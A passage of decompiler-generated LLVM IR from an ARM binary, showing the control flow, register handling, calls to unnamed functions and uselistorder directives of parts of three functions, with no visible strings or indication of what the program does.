dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a80
  %v2_12a78 = call i32 @function_140cc(i32 %v0_12a8c, i32 %v0_12a88)
  %v0_12a7c = load i32, i32* @r5, align 4
  %v2_12a7c = add i32 %v0_12a7c, %v2_12a78
  store i32 %v2_12a7c, i32* @r5, align 4
  %v0_12a84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12a80

dec_label_pc_12a80:                               ; preds = %dec_label_pc_12a80.preheader, %dec_label_pc_12a78
  %v0_12a88 = phi i32 [ 12, %dec_label_pc_12a80.preheader ], [ %v2_12a7c, %dec_label_pc_12a78 ]
  %v0_12a90 = phi i32 [ 0, %dec_label_pc_12a80.preheader ], [ %v0_12a84.pre, %dec_label_pc_12a78 ]
  store i32 %v0_12a88, i32* @r1, align 4
  %v0_12a8c = load i32, i32* @r7, align 4
  store i32 %v0_12a8c, i32* @r0, align 4
  %v1_12a90 = add i32 %v0_12a90, 1
  store i32 %v1_12a90, i32* @r4, align 4
  %v5_12a94 = icmp slt i32 %v0_12a90, 1
  br i1 %v5_12a94, label %dec_label_pc_12a78, label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a80
  br label %dec_label_pc_12bf4

dec_label_pc_12aac:                               ; preds = %bb205
  store i32 %v2_12aac, i32* @r4, align 4
  %v0_12ab0 = load i32, i32* @r7, align 4
  %v0_12ab8 = load i32, i32* @fp, align 4
  %v5_12ac0 = call i32 @function_140e0(i32 %v0_12ab0, i32 %v0_12ab4, i32 %v0_12ab8, i32* nonnull %stack_var_-140)
  %v1_12ac4 = icmp slt i32 %v5_12ac0, 0
  br i1 %v1_12ac4, label %dec_label_pc_12ad0, label %dec_label_pc_12aec

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12aac
  %v2_12ad4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_12ad4, label %dec_label_pc_12cbc, label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %dec_label_pc_12ad0
  br i1 %v2_12ae0, label %dec_label_pc_12cbc, label %dec_label_pc_12c08

dec_label_pc_12aec:                               ; preds = %dec_label_pc_12aac
  %v2_12af0 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_12af0, label %dec_label_pc_12b94, label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12aec
  %v0_12af8 = load i32, i32* @r8, align 4
  %v6_12afc = add i32 %v0_12af8, 36
  %v7_12afc = inttoptr i32 %v6_12afc to i32*
  %v8_12afc = load i32, i32* %v7_12afc, align 4
  store i32 %v8_12afc, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_12aac, i32* @r1, align 4
  store i32 %v0_12af8, i32* @r0, align 4
  %v0_12b18 = call i32 @function_ec10()
  %v0_12b1c = load i32, i32* @r8, align 4
  %v1_12b1c = add i32 %v0_12b1c, 4
  %v2_12b1c = inttoptr i32 %v1_12b1c to i32*
  %v3_12b1c = load i32, i32* %v2_12b1c, align 4
  %v7_12b20 = icmp eq i32 %v3_12b1c, 24
  br i1 %v7_12b20, label %dec_label_pc_12b44, label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12af8
  %v1_12b28 = add i32 %v0_12b1c, 28
  %v2_12b28 = inttoptr i32 %v1_12b28 to i32*
  %v3_12b28 = load i32, i32* %v2_12b28, align 4
  %v2_12b2c = icmp eq i32 %v3_12b28, 0
  br i1 %v2_12b2c, label %dec_label_pc_12c08, label %dec_label_pc_12b34

dec_label_pc_12b34:                               ; preds = %dec_label_pc_12b28
  br i1 %v7_12b38, label %dec_label_pc_12b44, label %bb203

bb203:                                            ; preds = %dec_label_pc_12b34
  br i1 %v8_12b3c, label %dec_label_pc_12b44, label %dec_label_pc_12c08

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12b34, %bb203, %dec_label_pc_12af8
  %v9_12b48 = icmp eq i32 %v3_12b1c, %arg2
  br i1 %v9_12b48, label %dec_label_pc_12b5c, label %dec_label_pc_12b50

dec_label_pc_12b50:                               ; preds = %dec_label_pc_12b44
  %v1_12b50 = inttoptr i32 %v0_12b1c to i32*
  %v2_12b50 = load i32, i32* %v1_12b50, align 4
  %v1_12b54 = call i32 @function_fa5c(i32 %v2_12b50)
  br label %dec_label_pc_12be0

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b44
  %v1_12b64 = add i32 %v0_12b1c, 16
  %v2_12b64 = inttoptr i32 %v1_12b64 to i32*
  %v3_12b64 = load i32, i32* %v2_12b64, align 4
  %v2_12b68 = sub i32 %tmp155, %stack_var_-192.0
  %v1_12b6c = add i32 %v2_12b68, -1
  %v1_12b70 = add i32 %v3_12b64, 4
  %v2_12b74 = mul i32 %v1_12b70, %v1_12b6c
  %v1_12b78 = add i32 %v0_12b1c, 32
  %v2_12b78 = inttoptr i32 %v1_12b78 to i32*
  %v3_12b78 = load i32, i32* %v2_12b78, align 4
  %v2_12b80 = add i32 %v0_12b1c, 36
  %v3_12b80 = inttoptr i32 %v2_12b80 to i32*
  store i32 %v1_12b6c, i32* %v3_12b80, align 4
  %tmp294 = icmp ugt i32 %v2_12b74, %v3_12b78
  br i1 %tmp294, label %dec_label_pc_12c08, label %dec_label_pc_12b5c.dec_label_pc_12bdc_crit_edge

dec_label_pc_12b5c.dec_label_pc_12bdc_crit_edge:  ; preds = %dec_label_pc_12b5c
  %v1_12bdc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_12bdc

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12aec
  %v3_12b94 = load i32, i32* %stack_var_-140, align 4
  %v1_12b98 = call i32 @function_fa5c(i32 %v3_12b94)
  br i1 %v9_12ba4, label %dec_label_pc_12bac, label %dec_label_pc_12be0

dec_label_pc_12bac:                               ; preds = %dec_label_pc_12b94
  %v0_12bac = load i32, i32* @r8, align 4
  %v1_12bac = add i32 %v0_12bac, 16
  %v2_12bac = inttoptr i32 %v1_12bac to i32*
  %v3_12bac = load i32, i32* %v2_12bac, align 4
  %v9_12bb4 = icmp eq i32 %v3_12bac, %tmp146
  br i1 %v9_12bb4, label %dec_label_pc_12bbc, label %dec_label_pc_12cb4

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12bac
  %v1_12bbc = add i32 %v0_12bac, 36
  %v2_12bbc = inttoptr i32 %v1_12bbc to i32*
  %v3_12bbc = load i32, i32* %v2_12bbc, align 4
  %v1_12bc0 = add i32 %v0_12bac, 28
  %v2_12bc0 = inttoptr i32 %v1_12bc0 to i32*
  %v3_12bc0 = load i32, i32* %v2_12bc0, align 4
  %v3_12bc4 = mul i32 %v3_12bbc, %tmp146
  %v4_12bc4 = add i32 %v3_12bc0, %v3_12bc4
  store i32 %v4_12bc4, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_12bd0 = call i32 @function_ec10()
  %v0_12bd4 = load i32, i32* @r8, align 4
  %v1_12bd4 = add i32 %v0_12bd4, 36
  %v2_12bd4 = inttoptr i32 %v1_12bd4 to i32*
  %v3_12bd4 = load i32, i32* %v2_12bd4, align 4
  %v1_12bd8 = add i32 %v3_12bd4, 1
  br label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12b5c.dec_label_pc_12bdc_crit_edge, %dec_label_pc_12bbc
  %v1_12bdc = phi i32 [ %v0_12bd4, %dec_label_pc_12bbc ], [ %v1_12bdc.pre, %dec_label_pc_12b5c.dec_label_pc_12bdc_crit_edge ]
  %storemerge5 = phi i32 [ %v1_12bd8, %dec_label_pc_12bbc ], [ 0, %dec_label_pc_12b5c.dec_label_pc_12bdc_crit_edge ]
  %v2_12bdc = add i32 %v1_12bdc, 36
  %v3_12bdc = inttoptr i32 %v2_12bdc to i32*
  store i32 %storemerge5, i32* %v3_12bdc, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12b94, %dec_label_pc_12b50, %dec_label_pc_12bdc
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_12bdc ], [ 0, %dec_label_pc_12b94 ], [ %stack_var_-212.2, %dec_label_pc_12b50 ]
  %v1_12be8 = add i32 %stack_var_-192.0, 1
  %v0_12bf0 = load i32, i32* @r5, align 4
  %v2_12bf0 = add i32 %v0_12bf0, %v5_12ac0
  store i32 %v2_12bf0, i32* @r5, align 4
  br label %dec_label_pc_12bf4

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12a98, %dec_label_pc_12be0
  %v0_12ab4 = phi i32 [ %v0_12a88, %dec_label_pc_12a98 ], [ %v2_12bf0, %dec_label_pc_12be0 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_12a98 ], [ %stack_var_-212.1, %dec_label_pc_12be0 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_12a98 ], [ %v1_12be8, %dec_label_pc_12be0 ]
  %v2_12bfc = sub i32 %stack_var_-192.0, %tmp155
  %v4_12bfc = xor i32 %stack_var_-192.0, %tmp155
  %v5_12bfc = xor i32 %v2_12bfc, %stack_var_-192.0
  %v6_12bfc = and i32 %v5_12bfc, %v4_12bfc
  %v5_12c00 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_12c00, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_12bf4
  %v7_12c00 = load i32, i32* @fp, align 4
  %v8_12c00 = sub i32 %v0_12ab4, %v7_12c00
  %v10_12c00 = xor i32 %v7_12c00, %v0_12ab4
  %v11_12c00 = xor i32 %v8_12c00, %v0_12ab4
  %v12_12c00 = and i32 %v11_12c00, %v10_12c00
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_12bf4, %bb204
  %v1_12c04.in = phi i32 [ %v6_12bfc, %dec_label_pc_12bf4 ], [ %v12_12c00, %bb204 ]
  %v0_12c04.in = phi i32 [ %v2_12bfc, %dec_label_pc_12bf4 ], [ %v8_12c00, %bb204 ]
  %v0_12c04 = icmp slt i32 %v0_12c04.in, 0
  %v1_12c04 = icmp slt i32 %v1_12c04.in, 0
  %v2_12c04 = xor i1 %v1_12c04, %v0_12c04
  br i1 %v2_12c04, label %dec_label_pc_12aac, label %dec_label_pc_12c08

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12adc, %bb203, %dec_label_pc_12b5c, %dec_label_pc_12b28, %bb205
  %v1_12c0c = call i32 @function_ca18(i32 %v3_128ec)
  %v3_12c10 = load i32, i32* %stack_var_0, align 4
  %v2_12c14 = icmp eq i32 %v3_12c10, 0
  br i1 %v2_12c14, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_12c08
  %v1_12c1c = load i32, i32* @r7, align 4
  %v3_12c18 = inttoptr i32 %v3_12c10 to i32*
  store i32 %v1_12c1c, i32* %v3_12c18, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_12c08
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 76836, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12c14, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  %v2_12c24 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_126b8, i32* @r4, align 4
  %v1_12c2c = call i32 @function_fa5c(i32 %v2_12c24)
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_12c44 = call i32 @function_10840()
  %v1_12c54 = call i32 @function_10838()
  %v0_12c60 = load i32, i32* @r6, align 4
  %v3_12c60 = sdiv i32 %v0_12c60, 256
  %v0_12c64 = load i32, i32* @sl, align 4
  store i32 %v0_12c64, i32* @global_var_21b60.550, align 4
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_12c70 = trunc i32 %v3_12c60 to i8
  store i8 %v1_12c70, i8* @global_var_1f4ad.553, align 1
  %v1_12c74 = trunc i32 %v0_12c60 to i8
  store i8 %v1_12c74, i8* bitcast (i8** @global_var_1f4ac.552 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_12c84.564 to i32), i32* @lr, align 4
  %v1_12c80 = call i32 @function_10840()
  %v0_12e0c.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_12e0c

dec_label_pc_12c88:                               ; preds = %dec_label_pc_1291c, %dec_label_pc_1293c
  %v0_12c88 = load i32, i32* @sl, align 4
  %v1_12c88 = add i32 %v0_12c88, 1
  %v2_12c90 = call i32 @function_c930(i32 %v1_12c88, i32 %arg3)
  store i32 %v2_12c90, i32* @sl, align 4
  %v2_12c94 = icmp eq i32 %v2_12c90, 0
  br i1 %v2_12c94, label %dec_label_pc_12c9c, label %dec_label_pc_12d54.backedge

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c88
  %v1_12ca4 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_12d58.outer.backedge

dec_label_pc_12d58.outer.backedge:                ; preds = %dec_label_pc_12c9c, %dec_label_pc_12d38, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_12a30, %.thread19 ], [ -1, %dec_label_pc_12d38 ], [ -1, %dec_label_pc_12c9c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_12d40, %dec_label_pc_12d38 ], [ %v1_12ca4, %dec_label_pc_12c9c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_1273c.lr.ph, label %dec_label_pc_12d74

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12bac
  %v1_12cb4 = inttoptr i32 %v0_12bac to i32*
  %v2_12cb4 = load i32, i32* %v1_12cb4, align 4
  %v1_12cb8 = call i32 @function_fa5c(i32 %v2_12cb4)
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12a4c, %dec_label_pc_129a0, %dec_label_pc_12adc, %dec_label_pc_12ad0, %dec_label_pc_129b8, %dec_label_pc_12980, %dec_label_pc_12cb4
  br i1 %v2_12cc0, label %dec_label_pc_12cc8, label %dec_label_pc_12d24

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12cbc
  store i32 %v2_126b8, i32* @r5, align 4
  store i32 %v2_126b8, i32* @r0, align 4
  %v1_12ce0 = call i32 @function_10840()
  %v1_12cf0 = call i32 @function_10838()
  %v2_12cfc = load i32, i32* @global_var_21dc0.558, align 4
  store i32 %v2_126b8, i32* @r0, align 4
  store i32 77072, i32* @lr, align 4
  %v1_12d0c = call i32 @function_10840()
  %v1_12d14 = add i32 %v2_12cfc, -1
  store i32 %v1_12d14, i32* @r4, align 4
  %v5_12d1c = icmp slt i32 %v6_12d1c, %v1_12d14
  br i1 %v5_12d1c, label %.thread27, label %dec_label_pc_12d24

.thread27:                                        ; preds = %dec_label_pc_12cc8
  %v7_12d1c = add i32 %v6_12d1c, 1
  br label %dec_label_pc_12d54.backedge

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12cc8, %dec_label_pc_12cbc
  %v0_12d24 = load i32, i32* @sl, align 4
  %v1_12d24 = add i32 %v0_12d24, 1
  %v2_12d2c = call i32 @function_c930(i32 %v1_12d24, i32 %arg3)
  store i32 %v2_12d2c, i32* @sl, align 4
  %v2_12d30 = icmp eq i32 %v2_12d2c, 0
  br i1 %v2_12d30, label %dec_label_pc_12d38, label %dec_label_pc_12d54.backedge

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d24
  %v1_12d40 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_12d58.outer.backedge

dec_label_pc_12d54.backedge:                      ; preds = %dec_label_pc_12c88, %dec_label_pc_12d24, %.thread27
  %storemerge87 = phi i32 [ %v7_12d1c, %.thread27 ], [ -1, %dec_label_pc_12d24 ], [ -1, %dec_label_pc_12c88 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_1273c.lr.ph.preheader, label %dec_label_pc_12d74

dec_label_pc_1273c.lr.ph.preheader:               ; preds = %dec_label_pc_1273c.lr.ph.preheader.lr.ph, %dec_label_pc_12d54.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_1273c.lr.ph.preheader.lr.ph ], [ %v3_128ec, %dec_label_pc_12d54.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_12734, %dec_label_pc_1273c.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_12d54.backedge ]
  %v0_12d54259 = phi i32 [ -1, %dec_label_pc_1273c.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_12d54.backedge ]
  br label %dec_label_pc_1273c.lr.ph

dec_label_pc_1273c.lr.ph:                         ; preds = %dec_label_pc_1273c.lr.ph.preheader, %dec_label_pc_12d58.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v3_128ec, %dec_label_pc_12d58.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_1273c.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_12d58.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_1273c.lr.ph.preheader ]
  %v6_12d1c = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_12d58.outer.backedge ], [ %v0_12d54259, %dec_label_pc_1273c.lr.ph.preheader ]
  %v1_127e4 = icmp slt i32 %v6_12d1c, 0
  %v4_12820 = mul i32 %v6_12d1c, 4
  %v5_12820 = add i32 %v4_12820, ptrtoint (i32* @global_var_21da0.562 to i32)
  %v6_12820 = inttoptr i32 %v5_12820 to i32*
  br label %dec_label_pc_1273c

dec_label_pc_12d68:                               ; preds = %bb195, %.thread8, %dec_label_pc_12694, %dec_label_pc_12688
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %dec_label_pc_126a4, %dec_label_pc_12d54.backedge, %dec_label_pc_12d58.outer.backedge, %bb200, %dec_label_pc_1282c, %dec_label_pc_12d58.backedge, %dec_label_pc_12d68
  %stack_var_-216.2 = phi i32 [ -1, %dec_label_pc_12d68 ], [ %v3_128ec, %dec_label_pc_12d58.backedge ], [ %v1_12744, %dec_label_pc_1282c ], [ %v1_12744, %bb200 ], [ %v3_128ec, %dec_label_pc_12d58.outer.backedge ], [ -1, %dec_label_pc_126a4 ], [ %v3_128ec, %dec_label_pc_12d54.backedge ]
  %v0_12d74 = call i32 @function_11004()
  %v2_12d7c = inttoptr i32 %v0_12d74 to i32*
  store i32 -1, i32* %v2_12d7c, align 4
  %v0_12d80 = load i32, i32* @sb, align 4
  store i32 %v0_12d80, i32* @r6, align 4
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12a70, %dec_label_pc_12d74
  %v1_12d8c = phi i32 [ %stack_var_-216.2, %dec_label_pc_12d74 ], [ %v3_128ec, %dec_label_pc_12a70 ]
  %v7_12d88 = icmp eq i32 %v1_12d8c, -1
  br i1 %v7_12d88, label %bb209, label %bb208

bb208:                                            ; preds = %dec_label_pc_12d84
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_12d84, %bb208
  store i32 77204, i32* @lr, align 4
  %v1_12d90 = xor i1 %v7_12d88, true
  call void @__pseudo_cond_branch(i1 %v1_12d90, i32 ptrtoint (i32* @global_var_ca18.555 to i32))
  %v2_12d94 = load i32, i32* %stack_var_-236, align 4
  %v1_12d98 = call i32 @function_fa5c(i32 %v2_12d94)
  %v0_12d9c = load i32, i32* @r7, align 4
  %v1_12da0 = call i32 @function_fa5c(i32 %v0_12d9c)
  %v0_12da4 = load i32, i32* @sl, align 4
  %v7_12da4 = icmp eq i32 %v0_12da4, -1
  br i1 %v7_12da4, label %bb210, label %dec_label_pc_12db0

bb210:                                            ; preds = %bb209
  br label %dec_label_pc_12e0c

dec_label_pc_12db0:                               ; preds = %bb209
  %v2_12db0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_12db0, i32* @r0, align 4
  %v1_12dc8 = call i32 @function_10840()
  %v1_12dd8 = call i32 @function_10838()
  %v0_12de4 = load i32, i32* @r6, align 4
  %v3_12de4 = sdiv i32 %v0_12de4, 256
  %v0_12de8 = load i32, i32* @sl, align 4
  store i32 %v0_12de8, i32* @global_var_21b60.550, align 4
  store i32 %v2_12db0, i32* @r0, align 4
  %v1_12df4 = trunc i32 %v3_12de4 to i8
  store i8 %v1_12df4, i8* @global_var_1f4ad.553, align 1
  %v1_12df8 = trunc i32 %v0_12de4 to i8
  store i8 %v1_12df8, i8* bitcast (i8** @global_var_1f4ac.552 to i8*), align 4
  store i32 77320, i32* @lr, align 4
  %v1_12e04 = call i32 @function_10840()
  br label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %bb210, %bb207, %dec_label_pc_12db0
  %v0_12e0c = phi i32 [ %v0_12da4, %bb210 ], [ %v0_12e0c.pre, %bb207 ], [ -1, %dec_label_pc_12db0 ]
  store i32 %v3_12640, i32* @r4, align 4
  store i32 %v6_12640, i32* @r5, align 4
  store i32 %v9_12640, i32* @r6, align 4
  store i32 %v12_12640, i32* @r7, align 4
  store i32 %v15_12640, i32* @r8, align 4
  store i32 %v18_12640, i32* @sb, align 4
  store i32 %v21_12640, i32* @sl, align 4
  ret i32 %v0_12e0c

; uselistorder directives
  uselistorder i32 %v0_12de4, { 1, 0 }
  uselistorder i32 %v0_12da4, { 1, 0 }
  uselistorder i1 %v7_12d88, { 1, 0 }
  uselistorder i32 %v6_12d1c, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_12c60, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_12ab4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12bac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_12b6c, { 1, 0 }
  uselistorder i32 %v0_12a8c, { 1, 0 }
  uselistorder i32 %v0_12a90, { 1, 0 }
  uselistorder i32 %v5_12990, { 1, 0 }
  uselistorder i32 %v3_128ec, { 5, 0, 1, 2, 3, 4, 6, 8, 7, 10, 9, 12, 13, 11 }
  uselistorder i32 %v1_12858, { 1, 0 }
  uselistorder i32 %v2_127f8, { 1, 0 }
  uselistorder i32 %v1_12770, { 1, 2, 0 }
  uselistorder i1 %v7_12740, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_12744, { 1, 2, 0 }
  uselistorder i32 %v0_12734, { 1, 0 }
  uselistorder i32 %v2_126b8, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 4, 3, 1, 0, 2 }
  uselistorder i8* %stack_var_-100, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_ca18, { 2, 9, 8, 7, 6, 5, 4, 1, 13, 12, 3, 0, 11, 10 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_f84c, { 2, 0, 3, 4, 1 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_f7f4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_f8dc, { 2, 6, 4, 3, 1, 0, 5 }
  uselistorder i32 17, { 1, 10, 3, 6, 4, 7, 5, 8, 2, 9, 12, 11, 0 }
  uselistorder i32 (i32)* @function_f3c0, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ee60, { 2, 1, 0, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 5, 6, 3, 15, 13, 14, 7, 2, 9, 10, 11, 0, 8, 1, 12 }
  uselistorder i8* @global_var_1f4ad.553, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_c930, { 3, 2, 1, 0, 4, 8, 7, 6, 5 }
  uselistorder i32 (i32)* @function_f908, { 4, 3, 5, 2, 1, 6, 8, 7, 0 }
  uselistorder i32 512, { 3, 4, 1, 5, 2, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_12e0c, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_12d84, { 1, 0 }
  uselistorder label %dec_label_pc_12d74, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_12d68, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1273c.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12d54.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12cbc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12d58.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c88, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_12c08, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_12bf4, { 1, 0 }
  uselistorder label %dec_label_pc_12be0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12bdc, { 1, 0 }
  uselistorder label %dec_label_pc_12b44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12a80, { 1, 0 }
  uselistorder label %dec_label_pc_12a70, { 1, 0 }
  uselistorder label %dec_label_pc_12d58.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_128d8, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_1282c, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @function_12e18(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12e18:
  %v0_12e18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e18, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12e18
  %v5_12e18 = mul i32 %arg2, 256
  %v6_12e18 = and i32 %v5_12e18, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12e18, %bb
  %v10_12e48 = phi i32 [ %arg1, %dec_label_pc_12e18 ], [ %v6_12e18, %bb ]
  ret i32 %v10_12e48

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_12e4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e4c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12e4c = load i32, i32* @r4, align 4
  store i32 %v3_12e4c, i32* %stack_var_-28, align 4
  %v6_12e4c = load i32, i32* @r5, align 4
  %v9_12e4c = load i32, i32* @r6, align 4
  %v12_12e4c = load i32, i32* @r7, align 4
  %v15_12e4c = load i32, i32* @r8, align 4
  %v18_12e4c = load i32, i32* @sl, align 4
  %v2_12e50 = ptrtoint i32* %stack_var_-192 to i32
  %v2_12e54 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_12e54, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f4b0.415 to i32), i32* %r2.global-to-local, align 4
  %v1_12e68 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_1f4b0.415 to i32), i32* %r0.global-to-local, align 4
  store i32 77436, i32* @lr, align 4
  %v1_12e78 = call i32 @function_10838()
  store i32 %v1_12e78, i32* %r0.global-to-local, align 4
  %v2_12e80 = load i32, i32* @global_var_21dbc.420, align 4
  %v5_12e88 = icmp sgt i32 %v2_12e80, 0
  br i1 %v5_12e88, label %dec_label_pc_130c4, label %dec_label_pc_12e8c

dec_label_pc_12e8c:                               ; preds = %dec_label_pc_12e4c
  store i32 ptrtoint ([17 x i8]* @global_var_16fdc.571 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16ff0.573 to i32), i32* @r1, align 4
  %v3_12e94 = call i32 @function_cd94(i32 ptrtoint ([17 x i8]* @global_var_16fdc.571 to i32), i32 ptrtoint (i32* @global_var_16ff0.573 to i32))
  store i32 %v3_12e94, i32* %r0.global-to-local, align 4
  store i32 %v3_12e94, i32* @sl, align 4
  %v2_12e98 = icmp eq i32 %v3_12e94, 0
  br i1 %v2_12e98, label %dec_label_pc_12ea0, label %dec_label_pc_1308c.preheader

dec_label_pc_12ea0:                               ; preds = %dec_label_pc_12e8c
  store i32 ptrtoint ([24 x i8]* @global_var_16ff4.575 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16ff0.573 to i32), i32* @r1, align 4
  %v3_12ea8 = call i32 @function_cd94(i32 ptrtoint ([24 x i8]* @global_var_16ff4.575 to i32), i32 ptrtoint (i32* @global_var_16ff0.573 to i32))
  store i32 %v3_12ea8, i32* %r0.global-to-local, align 4
  store i32 %v3_12ea8, i32* @sl, align 4
  %v2_12eac = icmp eq i32 %v3_12ea8, 0
  br i1 %v2_12eac, label %dec_label_pc_130b8, label %dec_label_pc_1308c.preheader

